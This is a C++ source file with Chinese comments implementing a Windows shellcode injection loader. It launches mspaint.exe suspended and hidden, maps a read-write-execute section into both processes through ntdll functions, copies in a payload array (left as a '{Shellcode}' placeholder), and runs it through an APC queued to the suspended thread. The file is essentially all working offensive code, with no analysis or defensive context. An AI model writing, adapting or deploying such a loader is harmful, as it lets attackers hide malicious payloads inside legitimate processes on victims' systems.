#include <cstdio>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* pZwCreateSection)(
  OUT PHANDLE            SectionHandle,
  IN ULONG               DesiredAccess,
  IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER      MaximumSize OPTIONAL,
  IN ULONG               PageAttributess,
  IN ULONG               SectionAttributes,
  IN HANDLE              FileHandle OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
  HANDLE            SectionHandle,
  HANDLE            ProcessHandle,
  PVOID*            BaseAddress,
  ULONG_PTR         ZeroBits,
  SIZE_T            CommitSize,
  PLARGE_INTEGER    SectionOffset,
  PSIZE_T           ViewSize,
  DWORD             InheritDisposition,
  ULONG             AllocationType,
  ULONG             Win32Protect
);

typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
  HANDLE            ProcessHandle,
  PVOID             BaseAddress
);

typedef NTSTATUS(NTAPI* pZwClose)(
  _In_ HANDLE       Handle
);

typedef NTSTATUS(NTAPI* pZwQueueApcThread)(
  IN HANDLE               ThreadHandle,
  IN PIO_APC_ROUTINE      ApcRoutine,
  IN PVOID                ApcRoutineContext OPTIONAL,
  IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,
  IN ULONG                ApcReserved OPTIONAL
);

typedef NTSTATUS(NTAPI* pZwSetInformationThread)(
  _In_ HANDLE             ThreadHandle,
  _In_ THREADINFOCLASS    ThreadInformationClass,
  _In_ PVOID              ThreadInformation,
  _In_ ULONG              ThreadInformationLength
);

unsigned char shellcode[] = {Shellcode};

int main(int argc, char* argv[]) {
  HANDLE sh; // section handle
  HANDLE th; // thread handle
  STARTUPINFOA si = {};
  PROCESS_INFORMATION pi = {};
  PROCESS_BASIC_INFORMATION pbi = {};
  OBJECT_ATTRIBUTES oa;
  SIZE_T s = 4096;
  LARGE_INTEGER sectionS = { (DWORD) s };
  PVOID rb = NULL; // remote buffer
  PVOID lb = NULL; // local buffer

  ZeroMemory(&si, sizeof(STARTUPINFO));
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
  ZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
  si.cb = sizeof(STARTUPINFO);

  ZeroMemory(&oa, sizeof(OBJECT_ATTRIBUTES));

  HMODULE ntdll = GetModuleHandleA("ntdll");
  pZwCreateSection myZwCreateSection = (pZwCreateSection)(GetProcAddress(ntdll, "ZwCreateSection"));
  pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(ntdll, "NtMapViewOfSection"));
  pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, "ZwUnmapViewOfSection"));
  pZwQueueApcThread myZwQueueApcThread = (pZwQueueApcThread)GetProcAddress(ntdll, "ZwQueueApcThread");
  pZwSetInformationThread myZwSetInformationThread = (pZwSetInformationThread)GetProcAddress(ntdll, "ZwSetInformationThread");
  pZwClose myZwClose = (pZwClose)GetProcAddress(ntdll, "ZwClose");

  //创建挂起的进程
  if (!CreateProcessA(NULL, (LPSTR) "C:\\windows\\system32\\mspaint.exe", NULL, NULL, NULL,
      CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    printf("create process failed :(\n");
    return -2;
  };

  myZwCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
  printf("section handle: %p.\n", sh);

  //将部分映射到当前进程
  myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL,
      &s, 2, NULL, PAGE_EXECUTE_READWRITE);
  printf("local process mapped at address: %p.\n", lb);

  //将部分映射到远程进程
  myNtMapViewOfSection(sh, pi.hProcess, &rb, NULL, NULL, NULL,
      &s, 2, NULL, PAGE_EXECUTE_READWRITE);
  printf("remote process mapped at address: %p\n", rb);

  //复制有效负载
  memcpy(lb, shellcode, sizeof(shellcode));

  //从当前进程取消映射部分
  myZwUnmapViewOfSection(GetCurrentProcess(), lb);
  printf("mapped at address: %p.\n", lb);
  myZwClose(sh);

  sh = NULL;

  //创建一个新的线程
  myZwQueueApcThread(pi.hThread, (PIO_APC_ROUTINE)rb, 0, 0, 0);
  myZwSetInformationThread(pi.hThread, (THREADINFOCLASS)1, NULL, NULL);
  ResumeThread(pi.hThread);
  myZwClose(pi.hThread);
  myZwClose(th);

  return 0;

}
